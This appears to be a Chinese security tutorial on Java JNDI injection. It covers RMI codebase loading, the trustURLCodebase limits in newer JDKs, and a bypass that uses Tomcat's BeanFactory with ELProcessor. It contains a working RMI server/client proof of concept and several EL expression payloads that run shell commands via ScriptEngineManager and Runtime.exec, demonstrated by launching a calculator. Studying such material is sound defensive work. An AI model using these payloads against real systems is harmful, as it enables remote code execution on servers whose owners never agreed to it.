<p>Oracle官方关于Codebase的说明：<a href="https://docs.oracle.com/javase/1.5.0/docs/guide/rmi/codebase.html" target="_blank" rel="noopener noreferrer">https://docs.oracle.com/javase/1.5.0/docs/guide/rmi/codebase.html</a></p>
<p>Codebase指定了Java程序在网络上远程加载类的路径。RMI机制中交互的数据是序列化形式传输的，但是传输的只是对象的数据内容，RMI本身并不会传递类的代码。当本地没有该对象的类定义时，RMI提供了一些方法可以远程加载类，也就是RMI动态加载类的特性。</p>
<p>当对象发送序列化数据时，会在序列化流中附加上Codebase的信息，这个信息告诉接收方到什么地方寻找该对象的执行代码。Codebase实际上是一个URL表，该URL上存放了接收方需要的类文件。在大多数情况下，你可以在命令行上通过属性 java.rmi.server.codebase 来设置Codebase。</p>
<p>例如，如果所需的类文件在<code>Evil</code>的根目录下，那么设置Codebase的命令行参数如下（如果你把类文件打包成了jar，那么设置Codebase时需要指定这个jar文件）：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token parameter variable" style="color:#36acaa">-Djava.rmi.server.codebase</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">http://url:8080/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>当接收程序试图从该URL的<code>Evil</code>上下载类文件时，它会把类的包名转化成目录，在Codebase 的对应目录下查询类文件，如果你传递的是类文件 <code>com.project.test</code> ，那么接受方就会到下面的URL去下载类文件：</p>
<div class="language-http codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-http codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">http://url:8080/com/project/test.class</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="关于jndi-naming-reference的限制">关于JNDI Naming Reference的限制<a href="#关于jndi-naming-reference的限制" class="hash-link" aria-label="关于JNDI Naming Reference的限制的直接链接" title="关于JNDI Naming Reference的限制的直接链接">​</a></h3>
<p>如前文所述，JDK 7u21开始，<code>java.rmi.server.useCodebaseOnly</code>  默认值就为true，防止RMI客户端VM从其他Codebase地址上动态加载类。然而JNDI注入中的Reference  Payload并不受useCodebaseOnly影响，因为它没有用到 <code>RMI Class  loading</code>，它最终是通过<code>URLClassLoader</code>加载的远程类。</p>
<blockquote>
<p>NamingManager.java</p>
</blockquote>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">static ObjectFactory getObjectFactoryFromReference(Reference ref, String factoryName)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    throws IllegalAccessException,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    InstantiationException,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    MalformedURLException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Class&lt;?&gt; clas = null;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // Try to use current class loader</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    try {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         clas = helper.loadClass(factoryName);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    } catch (ClassNotFoundException e) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // ignore and continue</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // e.printStackTrace();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // All other exceptions are passed up.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // Not in class path; try to use codebase</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    String codebase;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if (clas == null &amp;&amp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            (codebase = ref.getFactoryClassLocation()) != null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        try {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            clas = helper.loadClass(factoryName, codebase);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } catch (ClassNotFoundException e) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return (clas != null) ? (ObjectFactory) clas.newInstance() : null;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>代码中会先尝试在本地CLASSPATH中加载类，不行再从Codebase中加载，<code>codebase</code>的值是通过<code>ref.getFactoryClassLocation()</code>获得。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">public Class&lt;?&gt; loadClass(String className, String codebase)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        throws ClassNotFoundException, MalformedURLException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ClassLoader parent = getContextClassLoader();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ClassLoader cl =</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return loadClass(className, cl);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>最后通过 <code>VersionHelper12.loadClass()</code> 中 <code>URLClassLoader</code>  加载了远程class。所以<code>java.rmi.server.useCodebaseOnly</code>不会限制JNDI  Reference的利用，有影响的是高版本JDK中的这几个系统属性：</p>
<ul>
<li><code>com.sun.jndi.rmi.object.trustURLCodebase</code></li>
<li><code>com.sun.jndi.cosnaming.object.trustURLCodebase</code></li>
<li><code>com.sun.jndi.ldap.object.trustURLCodebase</code></li>
</ul>
<p>做个实验，我们在JDK1.8.0_181下使用 RMI Server 构造恶意的JNDI Reference进行JNDI注入，报错如下：</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Exception in thread &quot;main&quot; javax.naming.ConfigurationException: The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    at javax.naming.InitialContext.lookup(InitialContext.java:417)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>而此时使用LDAP Server返回恶意Reference是可以成功利用的，因为JDK 8u191以后才对LDAP JNDI Reference进行了限制。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="绕过高版本jdk限制利用本地class作为reference-factory">绕过高版本JDK限制：利用本地Class作为Reference Factory<a href="#绕过高版本jdk限制利用本地class作为reference-factory" class="hash-link" aria-label="绕过高版本JDK限制：利用本地Class作为Reference Factory的直接链接" title="绕过高版本JDK限制：利用本地Class作为Reference Factory的直接链接">​</a></h3>
<p>在高版本中（如：JDK8u191以上版本）虽然不能从远程加载恶意的<code>Factory</code>，但是我们依然可以在<strong>返回的<code>Reference</code>中指定<code>Factory Class</code>；</strong></p>
<ol>
<li><strong>这个工厂类必须在受害目标本地的<code>CLASSPATH</code>中</strong></li>
<li><strong>工厂类必须实现 <code>javax.naming.spi.ObjectFactory</code>  接口</strong></li>
<li><strong>至少存在一个 <code>getObjectInstance()</code> 方法</strong></li>
</ol>
<p><code>org.apache.naming.factory.BeanFactory</code> 刚好满足条件并且存在被利用的可能。<code>org.apache.naming.factory.BeanFactory</code>  存在于Tomcat依赖包中，所以使用也是非常广泛。</p>
<p>该类在 <code>getObjectInstance()</code>  中会通过反射的方式实例化Reference所指向的<code>任意Bean Class</code>，并且会调用setter方法为所有的属性赋值。而该Bean  Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="利用举例">利用举例<a href="#利用举例" class="hash-link" aria-label="利用举例的直接链接" title="利用举例的直接链接">​</a></h4>
<p>根据<code>beanFactory</code>的代码逻辑，要求传入的<code>Reference</code>为<code>ResourceRef</code>类，这个情况下，目标<code>Bean  Class</code>必须有一个无参构造方法，有public的setter方法且参数为一个String类型。事实上，这些setter不一定需要是set..开头的方法，根据<code>org.apache.naming.factory.BeanFactory</code>中的逻辑，<strong>我们可以把某个方法强制指定为setter</strong>。</p>
<p>然后大佬们找到了<code>javax.el.ELProcessor</code>可以作为目标Class。</p>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="pomxml双方均需要">pom.xml（双方均需要）<a href="#pomxml双方均需要" class="hash-link" aria-label="pom.xml（双方均需要）的直接链接" title="pom.xml（双方均需要）的直接链接">​</a></h5>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">org.apache.tomcat</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">tomcat-catalina</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">8.5.0</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">&lt;!-- https://mvnrepository.com/artifact/org.apache.el/com.springsource.org.apache.el --&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">org.apache.el</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">com.springsource.org.apache.el</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">7.0.26</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="server">Server<a href="#server" class="hash-link" aria-label="Server的直接链接" title="Server的直接链接">​</a></h5>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.naming.ResourceRef;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.NamingException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.StringRefAddr;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.IOException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.rmi.AlreadyBoundException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.rmi.registry.LocateRegistry;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.rmi.registry.Registry;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) throws IOException, NamingException, AlreadyBoundException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Registry registry = LocateRegistry.createRegistry(1099);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;RMI LISTEN PORT 1099&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 强制将 &#x27;x&#x27; 属性的setter 从 &#x27;setX&#x27; 变为 &#x27;eval&#x27;, 详细逻辑见 BeanFactory.getObjectInstance 代码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 利用表达式执行命令</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;]).start()\&quot;)&quot;));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        registry.bind(&quot;Exploit&quot;, referenceWrapper);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="client">Client<a href="#client" class="hash-link" aria-label="Client的直接链接" title="Client的直接链接">​</a></h5>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.InitialContext;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.NamingException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Client {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) throws NamingException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //初始化环境</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        InitialContext init = new InitialContext();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 寻找Exploit，然后会执行EL表达式</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        init.lookup(&quot;rmi://127.0.0.1:1099/Exploit&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20210819112253475" src="/assets/images/image-20210819112253475-ec726019ffa85df9d34c0eda819b491a.png" width="3582" height="1856" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="几种变体的表达式">几种变体的表达式<a href="#几种变体的表达式" class="hash-link" aria-label="几种变体的表达式的直接链接" title="几种变体的表达式的直接链接">​</a></h4>
<p>前面的恶意表达式就是通过反射的方式来实现命令执行的，本地测试有如下几种变体，原理都是基于反射调用任意类方法：</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import javax.el.ELProcessor;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Test {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String poc = &quot;&#x27;&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;)&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                &quot;.newInstance().getEngineByName(&#x27;nashorn&#x27;)&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                &quot;.eval(\&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.lang.Runtime.getRuntime().exec(s);\&quot;)&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//        String poc = &quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;exec&#x27;,&#x27;&#x27;.getClass())&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//                &quot;.invoke(&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;)&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//                &quot;.invoke(null),&#x27;calc.exe&#x27;)}&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//        String poc = &quot;&#x27;&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;)&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//                &quot;.newInstance().getEngineByName(&#x27;JavaScript&#x27;)&quot; +</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//                &quot;.eval(\&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)\&quot;)&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        new ELProcessor().eval(poc);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="debug分析">Debug分析<a href="#debug分析" class="hash-link" aria-label="Debug分析的直接链接" title="Debug分析的直接链接">​</a></h4>
<p>因为<code>org.apache.naming.factory.BeanFactory</code> 类在 <code>getObjectInstance()</code>  中会通过反射的方式实例化Reference所指向的<code>任意Bean Class</code>，并且会调用setter方法为所有的属性赋值。而该Bean  Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。所以重点分析<code>getObjectInstance()</code></p>
